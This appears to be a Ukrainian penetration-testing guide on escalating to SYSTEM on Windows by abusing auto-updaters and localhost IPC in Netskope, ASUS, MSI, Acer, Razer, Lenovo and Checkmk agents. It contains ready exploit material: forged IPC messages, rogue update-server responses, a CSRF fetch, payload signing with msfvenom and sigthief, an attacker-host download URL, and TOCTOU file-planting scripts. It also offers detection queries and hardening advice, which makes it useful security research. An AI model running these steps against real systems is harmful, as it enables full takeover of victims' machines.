# Зловживання корпоративними автооновлювачами та привілейованим IPC (наприклад, Netskope, ASUS і MSI)

{{#include ../../banners/hacktricks-training.md}}

На цій сторінці узагальнено клас ланцюжків локального підвищення привілеїв у Windows, виявлених в корпоративних endpoint-агентах і автооновлювачах, які надають легкодоступний інтерфейс IPC і привілейований процес оновлення. Типовий приклад — Netskope Client для Windows < R129 (CVE-2025-0309), де користувач із низькими привілеями може змусити систему пройти реєстрацію на сервері під контролем атакувальника, а потім доставити шкідливий MSI, який служба встановить із привілеями SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Основні ідеї, які можна застосувати до подібних продуктів:
- Зловживати localhost IPC привілейованої служби, щоб примусово повторно зареєструвати її або змінити конфігурацію на сервер атакувальника.
- Реалізувати кінцеві точки оновлення постачальника, доставити шахрайський Trusted Root CA та спрямувати автооновлювач на шкідливий «підписаний» пакет.
- Обійти слабкі перевірки підписувача (списки дозволених CN), необов’язкові прапорці digest і невибагливі властивості MSI.
- Якщо IPC «зашифровано», отримати ключ/IV із загальнодоступних ідентифікаторів комп’ютера, що зберігаються в реєстрі.
- Якщо служба обмежує викликачів за шляхом до образу/назвою процесу, ін’єктувати код у процес зі списку дозволених або запустити такий процес у призупиненому стані й завантажити свою DLL за допомогою мінімальної модифікації контексту потоку.

До спеціальних локальних TCP-служб варто застосовувати таку саму перевірку ідентифікації та меж вводу, навіть якщо для доступу потрібен PIN-код чи інші облікові дані програми. Визначте процес, якому належить слухач, і його обліковий запис служби, а потім перевірте точний розгорнутий бінарний файл/версію та те, чи перевіряється довжина полів, контрольованих клієнтом, перш ніж їх копіюють у буфери фіксованого розміру або використовують для формування команди дочірнього процесу. У [рекомендаціях Microsoft щодо переповнення буфера](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) пояснюється, чому неперевірені зовнішні дані небезпечні у привілейованому нативному коді. Наявність слухача на loopback-інтерфейсі, жорстко заданих облікових даних або самої лише назви процесу не доводить можливість пошкодження пам’яті чи виконання коду з привілеями SYSTEM; доступність, авторизація, шлях виконання та засоби пом’якшення наслідків — це окремі умови. Під час звичайного переліку об’єктів дійте пасивно, а не надсилайте до працюючої служби дані довжини, що спричиняє аварійне завершення.

---
## 1) Примусова реєстрація на сервері атакувальника через localhost IPC

У багатьох агентах є процес інтерфейсу користувача в user mode, який взаємодіє зі службою SYSTEM через localhost TCP, використовуючи JSON.

Виявлено в Netskope:
- UI: stAgentUI (низький рівень цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Послідовність експлуатації:
1) Створіть JWT-токен реєстрації, чиї claims дають змогу керувати хостом backend (наприклад, AddonUrl). Використайте alg=None, щоб не потрібен був підпис.
2) Надішліть IPC-повідомлення з викликом команди provisioning, передавши свій JWT і назву tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Служба починає надсилати запити до вашого rogue server для enrollment/config, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо перевірка caller базується на шляху/назві, надсилайте запит від allow-listed vendor binary (див. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Перехоплення каналу оновлення для виконання коду від імені SYSTEM

Коли клієнт почне взаємодіяти з вашим сервером, реалізуйте очікувані endpoints і спрямуйте його на MSI зловмисника. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON-конфігурацію з дуже коротким інтервалом оновлення, наприклад:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM-сертифікат CA. Служба встановлює його до сховища Trusted Root локального комп’ютера.
3) /v2/checkupdate → Передайте метадані, що вказують на шкідливий MSI і фальшиву версію.

Обхід поширених перевірок, які трапляються на практиці:
- Список дозволених CN підписувачів: служба може лише перевіряти, чи дорівнює Subject CN значенню “netSkope Inc” або “Netskope, Inc.”. Ваша rogue CA може видати leaf-сертифікат із таким CN і підписати MSI.
- Властивість CERT_DIGEST: додайте нешкідливу властивість MSI з назвою CERT_DIGEST. Під час встановлення її не перевіряють.
- Необов’язкова перевірка digest: прапорець конфігурації (наприклад, check_msi_digest=false) вимикає додаткову криптографічну перевірку.

У результаті служба SYSTEM встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
і виконує довільний код від імені NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Урок обходу виправлення: якщо постачальник у відповідь додає до списку дозволених кілька «довірених» доменів замість криптографічної автентифікації джерела оновлень, шукайте редиректори або reverse proxy, що належать постачальнику, через які все ще можна спрямовувати трафік. У випадку Netskope подальші публічні дослідження показали, що список дозволених доменів епохи R129 усе ще можна було обійти через `rproxy.goskope.com`, який проксіював вміст Azure App Service, контрольований зловмисником. Сприймайте списки дозволених hostname як тимчасову перешкоду, а не межу довіри.<sup>[[14]](#references)</sup>

---
## 3) Підробка зашифрованих IPC-запитів (якщо наявні)

Починаючи з R127, Netskope обгорнула IPC JSON у поле encryptData, яке схоже на Base64. Реверс-інжиніринг показав, що використовується AES із ключем/IV, похідними від значень реєстру, доступних будь-якому користувачу:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Зловмисники можуть відтворити шифрування й надсилати коректні зашифровані команди від імені звичайного користувача.<sup>[[1]](#references)[[2]](#references)</sup> Загальна порада: якщо агент раптом починає «шифрувати» свій IPC, шукайте в HKLM ідентифікатори пристроїв, GUID продукту й ідентифікатори інсталяції, які можуть використовуватися як матеріал для шифрування.

---
## 4) Обхід списків дозволених IPC-клієнтів (перевірки шляху/імені)

Деякі служби намагаються автентифікувати клієнта, визначаючи PID TCP-з’єднання та порівнюючи шлях/ім’я образу зі списком дозволених бінарних файлів постачальника в Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні способи обходу:
- DLL injection у процес зі списку дозволених (наприклад, nsdiag.exe) і передавання IPC-запитів через проксі зсередини цього процесу.
- Запустіть бінарний файл зі списку дозволених у призупиненому стані й ініціалізуйте свою proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити правила захисту драйвера від втручання.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Ін’єкція, сумісна із захистом від втручання: призупинений процес + патч NtContinue

У продуктах часто є драйвер minifilter/OB callbacks (наприклад, Stadrv), який вилучає небезпечні права з дескрипторів захищених процесів:
- Процес: вилучає PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Потік: обмежує права до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний завантажувач у user mode, який дотримується цих обмежень:
1) Створіть процес із бінарного файлу постачальника з прапорцем CREATE_SUSPENDED.
2) Отримайте дескриптори, які вам усе ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION для процесу та дескриптор потоку з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або лише THREAD_RESUME, якщо ви патчите код за відомим RIP).
3) Перезапишіть ntdll!NtContinue (або інший thunk, який гарантовано буде завантажено на ранньому етапі) невеликим stub-кодом, що викликає LoadLibraryW для шляху до вашої DLL, а потім повертається назад.
4) Викличте ResumeThread, щоб виконати ваш stub у процесі й завантажити вашу DLL.

Оскільки ви не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME для вже захищеного процесу (ви створили його самі), політику драйвера дотримано.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Практичні інструменти
- NachoVPN (плагін Netskope) автоматизує створення rogue CA, підписування шкідливого MSI і обслуговує потрібні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope — це спеціалізований IPC-клієнт, який формує довільні IPC-повідомлення (за потреби — AES-зашифровані) і містить механізм ін’єкції в призупинений процес, щоб надсилати запити від імені бінарного файлу зі списку дозволених.<sup>[[4]](#references)</sup>

## 7) Швидкий порядок первинної перевірки невідомих механізмів оновлення/IPC

Під час аналізу нового endpoint-агента чи «допоміжного» набору утиліт для материнської плати зазвичай достатньо швидкого порядку перевірки, щоб зрозуміти, чи є перед вами перспективна ціль для privesc:<sup>[[6]](#references)</sup>

1) Перелічіть loopback-listener-и й визначте, яким процесам постачальника вони відповідають:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Перелічіть потенційні іменовані канали:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Зберіть дані маршрутизації, що зберігаються в реєстрі та використовуються IPC-серверами на основі плагінів:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Спершу витягніть назви endpoint-ів, JSON-ключі та command ID із клієнта в режимі користувача. Упаковані фронтенди Electron/.NET часто допускають leak повної схеми:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Шукайте фактичний предикат довіри, а не лише шлях виконання коду, який зрештою запускає процес:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Патерни, яким варто надати пріоритет:
- `CryptQueryObject`/розбір сертифікатів без `WinVerifyTrust` зазвичай означає, що «сертифікат існує» сприймалося як «сертифікат є довіреним», що дає змогу клонувати сертифікати та застосовувати інші трюки з підробленим підписувачем.
- Перевірки підрядка/суфікса для `Origin`, `Referer`, URL завантажень, назв процесів або CN підписувача — це не автентифікація. `contains(".vendor.com")` зазвичай можна експлуатувати за допомогою схожих доменів, контрольованих зловмисником.
- Якщо GUI з низькими привілеями вирішує, що «файл довірений», а SYSTEM broker лише використовує цей результат, патчинг або повторна реалізація клієнтської DLL/JS часто повністю обходить цей бар'єр (розділена валідація на кшталт Razer).
- Якщо broker копіює payload до `%TEMP%`/`C:\Windows\Temp`, а потім перевіряє або планує його запуск із цього шляху, одразу перевірте наявність вікон заміни TOCTOU, а також сусідніх модулів plugin, які надають альтернативні обгортки `ExecuteTask()` зі слабшими перевірками.<sup>[[6]](#references)</sup>

Для цілей, що активно використовують named pipe, PipeViewer — швидкий спосіб виявити слабкі DACL і доступні ззовні pipe, перш ніж починати глибокий реверсинг протоколу.<sup>[[11]](#references)</sup>

Якщо ціль автентифікує клієнтів лише за PID, шляхом до образу або назвою процесу, сприймайте це радше як перешкоду, а не як межу безпеки: часто достатньо впровадитися в легітимний клієнт або встановити з'єднання з процесу з allow-list, щоб пройти перевірки сервера. Для named pipe докладніше про цю техніку розповідає [ця сторінка про імперсонацію клієнта та зловживання pipe](named-pipe-client-impersonation.md).

Для привілейованого **broker очищення або відновлення** перевірте межу довіри до шляхів, а також ACL pipe. Користувач із нижчими привілеями може мати змогу вибрати місце відновлення або перейменувати проміжний файл резервної копії у спільному каталозі, навіть якщо виконуваний файл служби та її каталог встановлення захищені. Окремо підтвердьте, що клієнт може викликати команду відновлення, змінити саме проміжний файл або його назву, що broker працює з вищим рівнем привілеїв і що операція відновлення справді записує дані до вибраного захищеного шляху. Каталог для проміжних файлів із правом запису або доступна для читання pipe самі по собі не означають можливості довільного привілейованого запису; зіставлення шляхів і поведінку служби потрібно перевірити в коді або контрольованим тестуванням. Не викликайте невідому команду очищення під час пасивної розвідки, оскільки вона може видалити файли користувача.

---
## 8) Модульні broker add-in, автентифіковані лише підписами постачальника (шаблон Lenovo Vantage)

Новіший варіант, на який варто звернути увагу, — це **signed-client RPC broker**: процес робочого столу Lenovo із низькими привілеями, підписаний Lenovo, взаємодіє зі службою SYSTEM, а служба спрямовує команди JSON до набору add-in, описаних у XML, у `%ProgramData%`. Щойно вдається досягти виконання коду **всередині будь-якого прийнятого підписаного клієнта**, кожен контракт `runas="system"` стає частиною поверхні атаки.<sup>[[15]](#references)</sup>

Цінні примітиви, виявлені під час досліджень Lenovo Vantage:
- **Довіра до клієнта через підпис постачальника**: дослідники отримали автентифікований контекст, скопіювавши підписаний Lenovo EXE до каталогу з правом запису та виконавши side-load DLL (`profapi.dll`), завдяки чому довільний код запускався всередині клієнта, якому служба вже довіряла.
- **Виявлення поверхні атаки через manifest**: add-in оголошені в `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; кілька контрактів працюють як `SYSTEM`, тож перелік цих manifest часто швидше виявляє справжні привілейовані команди, ніж реверсинг самого broker.
- **Помилки окремих команд у межах автентифікованого каналу**: опинившись усередині довіреного клієнта, дослідники виявили в загальнодоступних матеріалах досліджень path traversal із race condition у командах оновлення/встановлення, зловживання raw SQL у привілейованих базах даних налаштувань і перевірки шляхів реєстру на основі підрядків, що давали змогу записувати дані поза призначеним hive.

Корисна розвідка цілі:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Практичний висновок: якщо набір допоміжних інструментів надає broker, який спочатку автентифікує **процес виклику**, а потім передає запити десяткам команд plugin/add-in, не зупиняйтеся після обходу початкової перевірки довіри. Вивантажте таблицю manifest/contract і окремо fuzz-те кожну команду з високими привілеями; автентифікований канал зазвичай приховує кілька багів другого етапу.

---
## 1) CSRF із браузера до localhost проти привілейованих HTTP API (ASUS DriverHub)

DriverHub постачається зі службою HTTP у user-mode (ADU.exe) на 127.0.0.1:53000, яка очікує виклики браузера з https://driverhub.asus.com. Фільтр Origin просто виконує `string_contains(".asus.com")` для заголовка Origin і URL завантаження, доступних через `/asus/v1.0/*`. Тому будь-який контрольований атакувальником хост, наприклад `https://driverhub.asus.com.attacker.tld`, проходить перевірку й може надсилати із JavaScript запити, що змінюють стан.<sup>[[6]](#references)</sup> Додаткові способи обходу див. у [основах CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md).

Практичний сценарій:
1) Зареєструйте домен, що містить `.asus.com`, і розмістіть на ньому шкідливу вебсторінку.
2) Використайте `fetch` або XHR для виклику привілейованого endpoint (наприклад, `Reboot`, `UpdateApp`) на `http://127.0.0.1:53000`.
3) Надішліть JSON body, очікуваний обробником, — упакований JS frontend показує наведену нижче схему.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Навіть наведений нижче PowerShell CLI успішно працює, якщо підмінити заголовок Origin довіреним значенням:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Будь-який перехід у браузері на сайт зловмисника стає CSRF-атакою на локальну систему в 1 клік (або в 0 кліків через `onload`), яка запускає допоміжний процес із правами SYSTEM.

---
## 2) Небезпечна перевірка цифрового підпису та клонування сертифіката (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує довільні виконувані файли, визначені в тілі JSON, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Для перевірки URL завантаження використовується та сама логіка пошуку підрядка, тому приймається `http://updates.asus.com.attacker.tld:8000/payload.exe`. Після завантаження ADU.exe лише перевіряє, чи містить PE підпис і чи відповідає рядок Subject ASUS, перш ніж запустити файл — без `WinVerifyTrust` і без перевірки ланцюжка сертифікатів.

Щоб скористатися цією схемою:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Клонуйте підписувача ASUS у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на схожому домені `.asus.com` і запустіть UpdateApp через описану вище CSRF-атаку з браузера.

Оскільки і фільтри Origin та URL шукають підрядки, а перевірка підписувача лише порівнює рядки, DriverHub завантажує та виконує бінарний файл зловмисника з підвищеними привілеями.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU у шляхах копіювання/виконання засобу оновлення (MSI Center CMD_AutoUpdateSDK)

Служба MSI Center із правами SYSTEM надає TCP-протокол, у якому кожен кадр має формат `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Основний компонент (Component ID `0f 27 00 00`) містить `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його обробник:
1) Копіює переданий виконуваний файл у `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє підпис через `CS_CommonAPI.EX_CA::Verify` (суб’єкт сертифіката має дорівнювати “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` має завершитися успішно).
3) Створює заплановане завдання, яке запускає тимчасовий файл із правами SYSTEM та аргументами, контрольованими зловмисником.

Скопійований файл не блокується між перевіркою та викликом `ExecuteTask()`. Зловмисник може:
- Надіслати кадр A із вказівником на легітимний бінарний файл із підписом MSI (це гарантує успішне проходження перевірки підпису та постановку завдання в чергу).
- Влаштувати гонку, надсилаючи повторювані повідомлення кадру B із вказівником на шкідливий payload, щоб перезаписати `MSI Center SDK.exe` одразу після завершення перевірки.

Коли планувальник запускає завдання, він виконує перезаписаний payload із правами SYSTEM, хоча перевірявся початковий файл. Для надійної експлуатації використовують дві goroutine/threads, які безперервно надсилають `CMD_AutoUpdateSDK`, доки не вдасться виграти вікно TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Експлуатація спеціального IPC із рівнем SYSTEM та impersonation (MSI Center + Acer Control Centre)

### Набори TCP-команд MSI Center
- Кожен плагін/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, збережений у `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 байти кадру визначають компонент, що дає зловмисникам змогу спрямовувати команди до довільних модулів.
- Плагіни можуть визначати власні засоби запуску завдань. `Support\API_Support.dll` надає `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і безпосередньо викликає `API_Support.EX_Task::ExecuteTask()` **без перевірки підпису** — будь-який локальний користувач може вказати на `C:\Users\<user>\Desktop\payload.exe` і гарантовано запустити його з правами SYSTEM.
- Перехоплення loopback-трафіку у Wireshark або інструментування .NET-бінарних файлів у dnSpy дає змогу швидко виявити відповідність компонентів і команд; після цього можна відтворювати кадри за допомогою власних клієнтів на Go/Python.<sup>[[6]](#references)</sup>

### Іменовані канали Acer Control Centre та рівні impersonation
- `ACCSvc.exe` (SYSTEM) надає `\\.\pipe\treadstone_service_LightMode`, а його discretionary ACL дозволяє віддаленим клієнтам підключатися (наприклад, через `\\TARGET\pipe\treadstone_service_LightMode`). Надсилання команди з ID `7` і шляхом до файлу викликає процедуру служби для запуску процесу.
- Бібліотека клієнта серіалізує разом з аргументами кінцевий байт-маркер (113). Динамічне інструментування за допомогою Frida/`TsDotNetLib` (поради щодо інструментування див. у [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показує, що нативний обробник зіставляє це значення з `SECURITY_IMPERSONATION_LEVEL` та SID рівня цілісності, перш ніж викликати `CreateProcessAsUser`.
- Заміна 113 (`0x71`) на 114 (`0x72`) спрямовує виконання до загальної гілки, яка зберігає повний токен SYSTEM і встановлює SID високого рівня цілісності (`S-1-16-12288`). Тому породжений бінарний файл запускається з необмеженими правами SYSTEM як локально, так і на іншій машині.
- Поєднайте це з доступним прапорцем інсталятора (`Setup.exe -nocheck`), щоб встановити ACC навіть на лабораторних ВМ і перевірити роботу каналу без обладнання виробника.<sup>[[6]](#references)</sup>

Ці помилки IPC показують, чому локальні служби мають забезпечувати взаємну автентифікацію (ALPC SIDs, фільтри `ImpersonationLevel=Impersonation`, фільтрацію токенів), а також чому всі допоміжні засоби для «запуску довільного бінарного файлу» в кожному модулі мають використовувати однакові перевірки підпису.

---
## 3) Допоміжні COM/IPC-компоненти-“elevator” зі слабкою перевіркою в user mode (Razer Synapse 4)

У Razer Synapse 4 з’явився ще один корисний приклад із цієї категорії: користувач із низькими привілеями може попросити COM-допоміжний компонент запустити процес через `RzUtility.Elevator`, тоді як рішення про довіру делегується DLL у user mode (`simple_service.dll`) замість надійної перевірки в межах привілейованого компонента.

Спостережений шлях експлуатації:
- Створіть екземпляр COM-об’єкта `RzUtility.Elevator`.
- Викличте `LaunchProcessNoWait(<path>, "", 1)`, щоб запросити запуск із підвищеними привілеями.
- У публічному PoC перевірку підпису PE у `simple_service.dll` вимкнено патчем перед надсиланням запиту, що дає змогу запустити довільний виконуваний файл, вибраний зловмисником.<sup>[[6]](#references)[[10]](#references)</sup>

Мінімальний виклик PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Загальний висновок: під час реверсингу «допоміжних» наборів програм не обмежуйтеся localhost TCP або іменованими каналами. Перевіряйте наявність COM-класів із назвами на кшталт `Elevator`, `Launcher`, `Updater` або `Utility`, а потім з’ясовуйте, чи привілейована служба сама перевіряє цільовий бінарний файл, чи просто довіряє результату, обчисленому DLL клієнта в user-mode, яку можна пропатчити. Ця схема характерна не лише для Razer: будь-яка розділена архітектура, у якій брокер із високими привілеями приймає рішення дозволити/заборонити від сторони з низькими привілеями, може стати поверхнею для privesc.


---
## Передбачуване виконання тимчасового скрипту під час відновлення MSI (Checkmk Agent / CVE-2024-0670)

Деякі агенти Windows досі виконують привілейовані дії, записуючи тимчасовий файл `.cmd` у `C:\Windows\Temp` і запускаючи його від імені `SYSTEM`. Якщо ім’я файлу передбачуване, а служба не створює надійним чином нові файли замість наявних, користувач із низькими привілеями може заздалегідь створити майбутній тимчасовий файл і позначити його як **read-only**, змусивши привілейований процес виконати контрольований зловмисником вміст замість власного скрипту.

Спостерігалося у вразливих збірках Checkmk Agent:
- шаблон тимчасового файлу: `cmk_all_<PID>_1.cmd`
- уразливі гілки: `2.0.0`, `2.1.0`, `2.2.0`
- тригер: **відновлення** MSI кешованого пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Практичний порядок дій:
1. Оцініть реалістичний діапазон PID за поточними ідентифікаторами процесів або PID запущеного агента.
2. Запишіть короткий `.cmd` payload у кодуванні **ASCII** (`Set-Content -Encoding Ascii` або перенаправлення в `cmd.exe`; не використовуйте вивід PowerShell у UTF-16 для batch-файлів).
3. Створіть файли `C:\Windows\Temp\cmk_all_<PID>_1.cmd` для всього можливого діапазону та позначте кожен як read-only.
4. Запустіть відновлення кешованого MSI, щоб привілейована служба спробувала відновити, а потім виконала тимчасовий скрипт.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Якщо вразливий продукт встановлено за допомогою Windows Installer, зіставте MSI-файл із випадковою назвою в `C:\Windows\Installer` із назвою продукту, перш ніж запускати відновлення:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Операційні примітки:
- `qwinsta` стане в пригоді, якщо `msiexec /fa` завершується помилкою в неінтерактивній оболонці WinRM і потрібно з’ясувати, чи може наявний сеанс робочого столу або від’єднаний сеанс належним чином запустити відновлення.<sup>[[7]](#references)</sup>
- Цей сценарій можна узагальнити на інші агенти кінцевих пристроїв і засоби оновлення, які **розміщують тимчасові скрипти в доступних для запису всім місцях, а згодом виконують їх від імені SYSTEM**. Перевіряйте наявність передбачуваних імен, відсутність семантики ексклюзивного створення та можливість запуску процесів відновлення/оновлення на вимогу.

### Відновлення інтерактивного інсталятора та привілейована консоль

PDF24 Creator 11.15.1 демонструє окремий ризик відновлення MSI: під час відновлення спеціальна дія встановлення принтера може запустити видиму консоль із правами SYSTEM. У версії 11.15.2 постачальник змінив інсталятор MSI, щоб усунути таку поведінку. Стара версія продукту — лише підказка для первинного аналізу. Перевірте зареєстрований або доступний пакет MSI, чи може цей користувач ініціювати відновлення, чи наявні вразлива спеціальна дія та затримка запису до файлу журналу, а також чи може інтерактивний робочий стіл відобразити консоль. Для створення затримки, про яку повідомлялося, використовували oplock для `faxPrnInst.log`; звичайного доступу до файлу на запис недостатньо. Неінтерактивна оболонка, недоступний пакет або виправлений інсталятор можуть перервати ланцюжок. Ця проблема не залежить від `AlwaysInstallElevated` і відрізняється від заміни передбачуваного тимчасового скрипту.

---
## Віддалене перехоплення ланцюжка постачання через слабку перевірку засобу оновлення (WinGUp / Notepad++)

У період із червня до грудня 2025 року зловмисники, які скомпрометували хостингову інфраструктуру, що підтримувала процес оновлення Notepad++, вибірково надсилали шкідливі маніфести вибраним жертвам. Старіші засоби оновлення на основі WinGUp не повністю перевіряли автентичність оновлень, тому зловмисна XML-відповідь могла перенаправляти клієнтів на URL-адреси під контролем зловмисників. Оскільки клієнт приймав вміст HTTPS, не перевіряючи одночасно довірений ланцюжок сертифікатів і дійсний PE-підпис завантаженого інсталятора, жертви завантажували та виконували троянізований `update.exe` NSIS.<sup>[[12]](#references)[[13]](#references)</sup>

Операційний процес (локальний експлойт не потрібен):
1. **Перехоплення інфраструктури**: скомпрометувати CDN/хостинг і відповідати на запити перевірки оновлень метаданими зловмисника, що вказують на шкідливу URL-адресу для завантаження.
2. **Троянізований NSIS**: інсталятор завантажує/виконує корисне навантаження та зловживає двома ланцюжками виконання:
   - **Власний підписаний бінарний файл + sideload**: додати підписаний `BluetoothService.exe` від Bitdefender і розмістити шкідливий `log.dll` у шляху пошуку. Під час запуску підписаного бінарного файла Windows виконує sideload `log.dll`, яка розшифровує та рефлексивно завантажує бекдор Chrysalis (захищений Warbird і використовує хешування API для ускладнення статичного виявлення).
   - **Ін’єкція shellcode за допомогою скрипту**: NSIS виконує скомпільований скрипт Lua, який використовує Win32 API (наприклад, `EnumWindowStationsW`) для ін’єкції shellcode та розміщення Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Рекомендації з посилення захисту/виявлення для будь-якого засобу автоматичного оновлення:
- Вимагайте **перевірки сертифіката й підпису** завантаженого інсталятора (закріплюйте сертифікат підписувача постачальника, відхиляйте невідповідні CN/ланцюжки) і підписуйте сам маніфест оновлення (наприклад, за допомогою XMLDSig). Блокуйте перенаправлення, задані в маніфесті, якщо їх не перевірено.
- Використовуйте **sideload власного підписаного бінарного файла** як напрямок перевірки після завантаження: сповіщайте, коли підписаний EXE постачальника завантажує DLL з іменем із-поза канонічного шляху інсталяції (наприклад, Bitdefender завантажує `log.dll` із Temp/Downloads), а також коли засіб оновлення розміщує/виконує в тимчасовій теці інсталятори з підписами не від постачальника.
- Відстежуйте **артефакти, специфічні для шкідливого ПЗ**, виявлені в цьому ланцюжку (корисні як загальні напрямки пошуку): mutex `Global\Jdhfv_1.0.1`, аномальні записи `gup.exe` у `%TEMP%` і етапи ін’єкції shellcode, керовані Lua.
- Notepad++ посилив захист WinGUp у версії v8.8.9 і новіших: тепер отриманий XML підписується (XMLDSig), а новіші збірки вимагають перевірки сертифіката й підпису завантаженого інсталятора замість того, щоб покладатися лише на транспорт.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading підписаного Bitdefender EXE файла <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
